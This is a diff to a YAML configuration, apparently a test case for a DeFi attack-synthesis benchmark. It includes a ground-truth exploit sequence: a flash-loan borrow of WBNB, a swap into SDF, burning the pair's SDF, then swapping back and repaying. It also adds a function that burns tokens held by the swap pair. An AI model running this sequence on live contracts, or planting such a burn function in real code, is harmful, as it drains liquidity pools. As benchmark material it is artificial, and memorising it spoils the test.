@@ -16,8 +16,9 @@ ctrt_name2deploy:
   - ["router", ""]
 
 extra_actions:
-  - "function burn_pair_sdf(uint256 amount) internal {
+  - "function burn_sdf_pair(uint256 amount) internal eurus {
     sdf.burn(address(pair), amount);
+    pair.sync();
     }"
 
 extra_deployments:
@@ -29,12 +30,11 @@ extra_statements:
 attack_goal_str: "wbnb"
 
 groundtruth:
-  - ["borrow", "owner", "wbnb", "1e16"]
-  - ["swap", "pair", "wbnb", "sdf", "1e16"]
-  - ["burn", "pair", "sdf", "sdf.balanceOf(address(pair)) - 1"]
-  - ["sync", "pair"]
-  - ["swap", "pair", "sdf", "wbnb", "sdf.balanceOf(attacker)"]
-  - ["payback", "owner", "wbnb", "1.003e16"]
+  - ["borrow", "wbnb", "owner", "1e16"]
+  - ["swap", "pair", "attacker", "wbnb", "sdf", "1e16", "pair.getAmountOut(1e16, address(wbnb))"]
+  - ["burn", "sdf", "pair", "sdf.balanceOf(address(pair)) - 1"]
+  - ["swap", "pair", "attacker", "sdf", "wbnb", "sdf.balanceOf(attacker)", "pair.getAmountOut(sdf.balanceOf(attacker), address(sdf))"]
+  - ["payback", "wbnb", "owner", "1e16 * 1003 / 1000"]
 
 # Information for search space building.
 roles:
@@ -49,7 +49,8 @@ roles:
     is_burnable: true
   "pair":
     is_swappair: true
-    uniswap_order: ["sdf", "wbnb"]
+    is_uniswap: true
+    token_pair: ["sdf", "wbnb"]
     support_swaps:
       "wbnb": ["sdf", "wbnb"]
       "sdf": ["sdf", "wbnb"]
